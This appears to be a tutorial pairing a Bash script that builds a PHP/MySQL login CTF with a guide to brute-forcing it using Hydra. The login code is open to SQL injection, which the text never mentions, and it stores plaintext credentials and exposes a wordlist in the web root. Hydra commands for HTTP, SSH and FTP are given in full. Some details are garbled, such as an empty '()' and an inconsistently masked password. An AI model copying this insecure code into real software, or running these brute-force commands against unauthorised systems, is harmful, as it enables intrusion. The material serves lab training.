Here is a Bash script to automate the setup of a basic Capture The Flag (CTF) challenge, where a website is hosted using PHP, and the default credentials are part of the RockYou 2024 password list.

The script will:

    Set up a LAMP stack (Apache, MySQL, PHP).
    Create a simple PHP login page.
    Set up a MySQL database with default credentials.
    Download and unzip the RockYou password list (if available).
    Start the Apache server to host the CTF.

CTF Setup Script: setup_ctf.sh

#!/bin/bash

# Function to check if a command exists
function check_command() {
    if ! command -v $1 &> /dev/null; then
        echo "$1 could not be found, installing..."
        sudo apt-get install -y $1
    else
        echo "$1 is already installed."
    fi
}

echo "Starting CTF setup..."

# 1. Update the system and install dependencies
echo "Updating system..."
sudo apt-get update -y
sudo apt-get upgrade -y

# 2. Install Apache, MySQL, PHP
echo "Installing Apache, MySQL, and PHP..."

check_command apache2
check_command mysql-server
check_command php
check_command libapache2-mod-php
check_command php-mysql
check_command unzip  # Needed for RockYou file

# 3. Start Apache and MySQL services
echo "Starting Apache and MySQL services..."
sudo systemctl start apache2
sudo systemctl start mysql
sudo systemctl enable apache2
sudo systemctl enable mysql

# 4. Download and setup the RockYou password list
echo "Downloading RockYou password list..."
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -P /var/www/html/

# 5. Create MySQL database and user table
echo "Setting up MySQL database and user credentials..."

# Secure MySQL Installation (Optional)
sudo mysql_secure_installation

# MySQL commands to create database and user
sudo mysql -u root <<EOF
CREATE DATABASE ctf_db;
USE ctf_db;
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL,
    password VARCHAR(255) NOT NULL
);
INSERT INTO users (username, password) VALUES ('admin', 'password123');
EOF

# 6. Create the PHP login page
echo "Creating the PHP login page..."
cat <<EOL | sudo tee /var/www/html/login.php
<?php
\$servername = "localhost";
\$username = "root";
\$password = "";
\$dbname = "ctf_db";

\$conn = new mysqli(\$servername, \$username, \$password, \$dbname);

if (\$conn->connect_error) {
    die("Connection failed: " . \$conn->connect_error);
}

if (\$_SERVER['REQUEST_METHOD'] == 'POST') {
    \$input_user = \$_POST['username'];
    \$input_pass = \$_POST['password'];
    
    \$sql = "SELECT * FROM users WHERE username='\$input_user' AND password='\$input_pass'";
    \$result = \$conn->query(\$sql);

    if (\$result->num_rows > 0) {
        echo "Login Successful! Here's your flag: FLAG{successful_login}";
    } else {
        echo "Login Failed!";
    }
}
?>
<html>
<head><title>Login Page</title></head>
<body>
<form action="login.php" method="post">
    Username: <input type="text" name="username"><br>
    Password: <input type="password" name="password"><br>
    <input type="submit" value="Login">
</form>
</body>
</html>
EOL

# 7. Set correct permissions for the web directory
echo "Setting up permissions..."
sudo chown -R www-data:www-data /var/www/html
sudo chmod -R 755 /var/www/html

# 8. Restart Apache to apply changes
echo "Restarting Apache..."
sudo systemctl restart apache2

echo "CTF setup is complete. Visit http://localhost/login.php to start the challenge!"

How to Use the Script

    Save the script: Create a new file named setup_ctf.sh and paste the above code into the file.

 
nano setup_ctf.sh

Make the script executable:


chmod +x setup_ctf.sh

Run the script as root:



    sudo ./setup_ctf.sh

What the Script Does:

    Installs LAMP Stack:
        Installs Apache, MySQL, PHP, and required PHP modules.
        Configures services to run automatically on startup.

    MySQL Setup:
        Creates a MySQL database named ctf_db.
        Creates a table named users and inserts default credentials ().

    PHP Login Page:
        Creates a PHP page (login.php) that checks the entered credentials against the MySQL database.
        If login is successful, it prints a flag (FLAG).

    RockYou Password List:
        Downloads the RockYou password list to /var/www/html/rockyou.txt, which can be used for password cracking during the CTF.

    Permissions:
        Adjusts file permissions so Apache can serve the PHP pages properly.
###

Hydra is a powerful tool for brute-force password cracking. It can be used to attack many services like FTP, SSH, HTTP login forms, and more. In this guide, I'll walk you through the process of using Hydra to brute-force a login form, which is particularly useful in scenarios like the PHP CTF challenge mentioned earlier.
Step-by-Step Guide to Using Hydra
1. Install Hydra

If Hydra is not already installed on your system, you can install it by running the following commands:

    For Debian-based systems (Ubuntu, Kali, etc.):

   

sudo apt-get update
sudo apt-get install hydra -y

For Fedora-based systems:


sudo dnf install hydra -y

For Arch-based systems:


    sudo pacman -S hydra

You can verify the installation by running:


hydra -h

This should display the help screen for Hydra.
2. Basic Hydra Syntax

The basic syntax for Hydra is:

hydra [options] service://target

For brute-forcing web forms (like the CTF login page), the syntax is:


hydra -l <username> -P <password list> <target> http-post-form "<path>:<post-data>:<success condition>"

3. Using Hydra to Attack an HTTP POST Form

Let’s assume you want to brute-force the PHP login form in the CTF you created earlier. The goal is to crack the password for the user admin using the RockYou password list.

Here’s a breakdown of how to use Hydra on an HTTP login form:
Step 1: Analyze the Login Form

You need to inspect the login form’s structure using your browser's developer tools to understand what POST data is sent when the form is submitted.

    Right-click on the login page (http://localhost/login.php) and select Inspect.
    Go to the Network tab, then fill in the form with some dummy data and hit Submit.
    Look at the form’s request and note the following details:
        The URL to which the form is submitted (e.g., /login.php).
        The names of the input fields (for username and password).
        The success message (e.g., "Login Successful!").

For the PHP login form in the example, let’s assume:

    The form action URL is /login.php.
    The username input field is named username.
    The password input field is named password.
    The success message is Login Successful!.

Step 2: Run Hydra Against the Form

To brute-force the password for the admin user using the RockYou password list, run the following Hydra command:

hydra -l admin -P /var/www/html/rockyou.txt localhost http-post-form "/login.php:username=^USER^&password=^PASS^:Login Successful!"

Explanation of the command:

    -l admin: Specifies the login username (admin in this case).
    -P /var/www/html/rockyou.txt: Specifies the password list (the RockYou list).
    localhost: The target (in this case, the local machine hosting the CTF challenge).
    http-post-form: Indicates Hydra is brute-forcing an HTTP POST form.
    /login.php: The URL endpoint of the login form.
    username=^USER^&password=^PASS^: Hydra will substitute ^USER^ with admin and ^PASS^ with each password from the list.
    Login Successful!: The condition Hydra looks for to know when a login is successful.

Step 3: Analyze Hydra’s Output

As Hydra runs, it will try different passwords from the RockYou list. If the correct password is found, Hydra will show a result like this:

[80][http-post-form] host: localhost   login: admin   password: #####

In this example, p##### is the correct password.
4. Customizing Hydra for Different Situations
Brute-Forcing Multiple Usernames

If you have a list of usernames, you can use -L to specify a username list:

hydra -L usernames.txt -P rockyou.txt localhost http-post-form "/login.php:username=^USER^&password=^PASS^:Login Successful!"

Stopping After the First Valid Login

By default, Hydra continues to brute-force after finding a valid login. To stop after the first successful attempt, add the -f flag:

hydra -l admin -P rockyou.txt localhost http-post-form "/login.php:username=^USER^&password=^PASS^:Login Successful!" -f

Limiting Attempts (Max Tries)

If you want to limit the number of password attempts (e.g., to avoid triggering rate-limiting):

hydra -l admin -P rockyou.txt -t 4 localhost http-post-form "/login.php:username=^USER^&password=^PASS^:Login Successful!"

Here, -t 4 limits Hydra to 4 concurrent attempts.
5. Troubleshooting Hydra

If Hydra doesn't find the password or stops working unexpectedly, here are some tips:

    Check the form structure: Make sure you’ve correctly identified the form's input field names and success condition.
    Use verbose mode: Adding -vV to the Hydra command will display each request it makes, which can help in debugging.
    Try different success conditions: The success message must match exactly. You can try partial strings or use regex patterns.

6. Additional Hydra Examples
SSH Bruteforce

Hydra can also be used to brute-force SSH login:

hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10

FTP Bruteforce

For FTP login brute-force:

hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://localhost

7. Best Practices

    Limit login attempts: Some systems may have protections like rate-limiting or account lockout after failed attempts. Be mindful of this.
    Be ethical: Only use Hydra in CTFs, penetration testing scenarios, or systems where you have permission.
    Password lists: The quality of the password list matters. For fast results, consider using smaller or custom lists for targeted attacks.

Conclusion

Hydra is a versatile tool that, when combined with the right target and strategy, can help you crack weak credentials in various services, including HTTP login forms. For your CTF challenge, this guide shows how Hydra can brute-force the login page and retrieve the flag.
